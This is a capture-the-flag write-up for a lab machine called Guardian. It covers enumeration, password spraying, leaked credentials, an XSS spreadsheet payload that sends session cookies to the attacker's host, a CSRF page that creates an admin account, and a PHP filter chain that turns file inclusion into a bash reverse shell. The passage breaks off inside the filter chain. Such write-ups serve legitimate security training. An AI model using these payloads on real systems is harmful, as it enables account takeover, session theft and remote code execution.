## Intro


Tags: #linux #WebApp #BruteForce #XSS #LFI #codereview #unknown-binary #hard 
Tools used:
- gobuster (directory and subdomain enumeration)
- hydra (login page bruteforce)
- php_filter_chain_generator.py (exploit via php filter)
- hashcat (cracking hashes with salt)
- ghidra (decompile binary for privesc)

----
# Reconnaissance

 Add target to /etc/hosts
```bash
sudo sh -c "echo '10.129.237.248 guardian.htb' >> /etc/hosts"
```

## Port scan

### TCP

```shell
sudo nmap -sC -sV -p- guardian.htb
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 08:47 CST
Nmap scan report for guardian.htb (10.129.237.248)
Host is up (0.0078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Guardian University - Empowering Future Leaders
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
```

## WebApp
### Banner grabbing
#### whatweb
```bash
whatweb guardian.htb
```

```bash
http://guardian.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], Email[GU0142023@guardian.htb,GU0702025@guardian.htb,GU6262023@guardian.htb,admissions@guardian.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.237.248], Script, Title[Guardian University - Empowering Future Leaders]
```

#### HTTP header
```bash
curl -I http://guardian.htb
```

```bash
HTTP/1.1 200 OK
Date: Fri, 26 Dec 2025 14:49:26 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Thu, 10 Jul 2025 16:06:12 GMT
ETag: "1a55-639955f4c2500"
Accept-Ranges: bytes
Content-Length: 6741
Vary: Accept-Encoding
Content-Type: text/html
```

## Directory Enumeration
```bash
gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u guardian.htb
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://guardian.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

http://guardian.htb/.html                (Status: 403) [Size: 277]

http://guardian.htb/.php                 (Status: 403) [Size: 277]

http://guardian.htb/index.html           (Status: 200) [Size: 6741]

http://guardian.htb/css                  (Status: 301) [Size: 310] [--> http://guardian.htb/css/]

http://guardian.htb/images               (Status: 301) [Size: 313] [--> http://guardian.htb/images/]

http://guardian.htb/js                   (Status: 301) [Size: 309] [--> http://guardian.htb/js/]

http://guardian.htb/javascript           (Status: 301) [Size: 317] [--> http://guardian.htb/javascript/]

http://guardian.htb/.html                (Status: 403) [Size: 277]

http://guardian.htb/.php                 (Status: 403) [Size: 277]

http://guardian.htb/server-status        (Status: 403) [Size: 277]

===============================================================
Finished
===============================================================
```

## Subdomain Enumeration
```bash
gobuster dns -d guardian.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     guardian.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================

Found: portal.guardian.htb

Found: Portal.guardian.htb

Found: PORTAL.guardian.htb

===============================================================
Finished
===============================================================
```
found subdomains!

### Subdomains found

create a list of users based on the users seen on home page
users
```shell
GU0142023@guardian.htb (Boone Basden)
GU6262023@guardian.htb (Jamesy Currin)
GU0702025@guardian.htb (Stephenie Vernau)
```
so extract the IDs:
```shell
GU0142023
GU6262023
GU0702025
```
`portal.guardian.htb`
default pass  was found on the help link inside a pdf
```shell
GU1234
```
## Page source

the subdomain could be found there also

## Navigating the web-app

the subdomain could be found there also (upper right "portal")

---
# Foothold

## Login page bruteforce

Since we know a password, and multiple users we need to correlate the password with the users, so we bruteforce the login page (seems more like password spraying in this case)
```shell
hydra -L usernames.txt -P passwords.txt portal.guardian.htb \
http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

```shell
http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-26 09:01:58
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking http-post-form://portal.guardian.htb:80/login.php:username=^USER^&password=^PASS^:Invalid
[80][http-post-form] host: portal.guardian.htb   login: GU0142023   password: GU1234
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-26 09:01:59
```
found those creds to be valid:
```shell
GU0142023   
GU1234
```
and we are in

### Web page login
![](MediaFiles/Pasted%20image%2020251226170428.png)

then went to chats
then chose one chat, and noticed the uri 
```shell
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=11
```
this format seemed ideal for fuzzing to me and thus i tried it: 

## Fuzzing

created number list first, then also pasted my phpsessionid on ffuf
```shell
seq 1 20 > numbers.txt
```
```shell
ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' -w numbers.txt:FUZZ1 -w numbers.txt:FUZZ2 -mode clusterbomb -H 'Cookie: PHPSESSID=8q68lrnl1fk0h22c1glhvflh72' -fl 178,164
```
the result here for the first fuzz is 2, and for the second is 1.

Now lets navigate using our fuzzed parameters:
```shell
http://portal.guardian.htb/student/chat.php?chat_users[0]=2&chat_users[1]=1
```
were possibly creds for another user are given to user `jamil.enockson`
![](MediaFiles/Pasted%20image%2020251226172359.png)
```shell
Here is your password for gitea: DHsNnk3V503 
```
#### creds obtained
```
jamil.enockson
DHsNnk3V503
```

## Another Subdomain found (gitea)

i tried gittea as user and did not work, so i thought gitea might be some subdomain, i navigated there and it worked: 
(add it on etc hosts first)
`http://gitea.guardian.htb/`
![](MediaFiles/Pasted%20image%2020251226172609.png)
sign in
![](MediaFiles/Pasted%20image%2020251226172627.png)
here we login with
```shell
jamil.enockson@guardian.htb
DHsNnk3V503
```
why `jamil.enockson`? -> inside the chat we found earlier the admin was replying to this user, so i assumed this might be the username and it worked.

we are now inside
![](MediaFiles/Pasted%20image%2020251226172914.png)
at the bottom, we can see the version being 
Gitea `1.23.7`

## WebApp Source code

then by going at the `Explore` page
![](MediaFiles/Pasted%20image%2020251226173029.png)
and then on portal.guardin.htb source code
![](MediaFiles/Pasted%20image%2020251226173107.png)

### DB creds found

inside the config.php i found DB creds for `mysql`!
```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```
#### creds obtained
```shell
root
Gu4rd14n_un1_1s_th3_b3st
```

## Checking project Dependencies

went on `composer.json`
`http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/composer.json`
```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```
found these versions:
```shell
phpoffice/phpspreadsheet: 3.7.0
phpoffice/phpword: ^1.3
```
By searching online i found that phpspreadsheet 3.7.0 had many `XSS` vulnerabilities

Specifically i found this:
https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx

then go to this site
https://www.treegrid.com/FSheet

```shell
"><img src=x onerror=fetch('http://10.10.15.152:9999/?c='+btoa(document.cookie))>
```
then export sheets to xlsx

then go here and upload
![](MediaFiles/Pasted%20image%2020251226185959.png)
towards the one that is "upcoming"

uploaded it and then received cookie
```shell
└──╼ [★]$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.129.237.248 - - [26/Dec/2025 11:08:23] "GET /?c=UEhQU0VTU0lEPWRvNDVxcXY0bGVtNjM3dGVlNzM3dGJ2cTNh HTTP/1.1" 200 -
```

```shell
echo UEhQU0VTU0lEPTBqMXBsNXV2dTJzcnU0N3JtMjcyaGVsbWo2 | base64 -d  

/?c=UEhQU0VTU0lEPTBqMXBsNXV2dTJzcnU0N3JtMjcyaGVsbWo2
```

```shell
PHPSESSID=0j1pl5uvu2sru47rm272helmj6
```
now replace this cookie in the browser and reload, we are now `Sammy Treat`
![](MediaFiles/Pasted%20image%2020251226191022.png)
Then I went to the Notice Board and found that I could leave a message, and the message link would be viewed by admin (it seemed to be another XSS)

I also went back to gitea and check the source code

### Source code

on `createuser.php` i found out that admin can create users (the password change logic in profile.php is actually useless)

```php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>
```

The logical part of csrf_token can be seen in csrf-tokens.php

```shell
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
    global $global_tokens_file;
    return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
    global $global_tokens_file;
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);
}
```

In other words, there is no deletion logic for csrf_token here. You can find any one that has been used. 

### Creating admin user

Write an exploit.html

the csrf_token value can be found inside `create.php`
```html
<div class="bg-white rounded-lg shadow p-6">
                <form action="create.php" method="POST">
                    <div class="mb-4">
                        <label for="title" class="block text-sm font-medium text-gray-700">Title</label>
                        <input type="text" name="title" id="title" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div class="mb-4">
                        <label for="content" class="block text-sm font-medium text-gray-700">Content</label>
                        <textarea name="content" id="content" rows="10" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500"></textarea>
                    </div>
                    <div class="mb-4">
                        <label for="reference_link" class="block text-sm font-medium text-gray-700">Reference Link (will be reviewed by admin)</label>
                        <input type="url" name="reference_link" id="reference_link" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <input type="hidden" name="csrf_token" value="f6ca44535dd2a4390347c7a5173dc4d8">
                    <div class="flex justify-end">
                        <button type="submit" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">
                            Create Notice
                        </button>
                    </div>
                </form>
            </div>
```

```shell
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit</title>
</head>
<body>
<h1>CSRF Exploit Test</h1>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
    <input type="hidden" name="username" value="ch3ckm8">
    <input type="hidden" name="password" value="th3b3stp4ssw0rd!">
    <input type="hidden" name="full_name" value="ch3ckm8 User">
    <input type="hidden" name="email" value="ch3ckm8@example.com">
    <input type="hidden" name="dob" value="1994-02-05">
    <input type="hidden" name="address" value="ch3ckm8's lair">
    <input type="hidden" name="user_role" value="admin">
    <input type="hidden" name="csrf_token" value="f6ca44535dd2a4390347c7a5173dc4d8">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

Send notification
go on notice board > create notice
```shell
portal.guardian.htb/lecturer/notices/create.php
```
and just write a placeholder title and content, then on reference link write the path of the location of the .html created above 
```shell
http://10.10.15.152:9999/exploit.html
```
in order to be retrieved via 
```shell
python3 -m http.server 9999
```
![](MediaFiles/Pasted%20image%2020251226192222.png)
and it was successfully retrieved
```shell
└──╼ [★]$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.129.237.248 - - [26/Dec/2025 11:22:39] "GET /exploit.html HTTP/1.1" 200 -
```
You can then log in to the Admin Panel using the following credentials

```
username: ch3ckm8
password: th3b3stp4ssw0rd!
```
success! we are now admin on the portal
![](MediaFiles/Pasted%20image%2020251226200650.png)

#### LFI

When I came to Reports, I found that there were file parameters in the URL
for example when clicking `Enrollment Report`
```shell
http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php

http://portal.guardian.htb/admin/reports.php?report=PHP_FILTER_CHAINS,system.php

report=PHP_FILTER_CHAINS,system.php
```
##### Testing

```shell
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.base64-encode/resource=reports/enrollment.php
```
![](MediaFiles/Pasted%20image%2020251226203248.png)

But trying to read/etc/passwd fails❌, go back to gitea and check the source code of report.php

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>
```

👉 If the path contains `..`(Directory crossing attempt), and simply reject it. 👉Only four types of files are allowed:`enrollment.php`、`academic.php`、`financial.php`、`system.php`(and the cases where they may be prefixed with a path). If there is no match, reject it directly. In fact, you can use php_filter_chains to attack here. Splicing system.php at the end will not affect the execution result, as follows

So the format we will use to exploit will be:
```
http://portal.guardian.htb/admin/reports.php?report="INSERT YOUR PHP FILTER HERE"

and also append at the end:
,system.php
```

##### Exploit

Next, just bounce the shell directly
https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py

```shell
php_filter_chain_generator.py --chain "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.152/9001 0>&1'\"); ?> " ;
```

Dont forget, this is the first part, php filter goes after it
```shell
http://portal.guardian.htb/admin/reports.php?report=
```
+
```shell
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.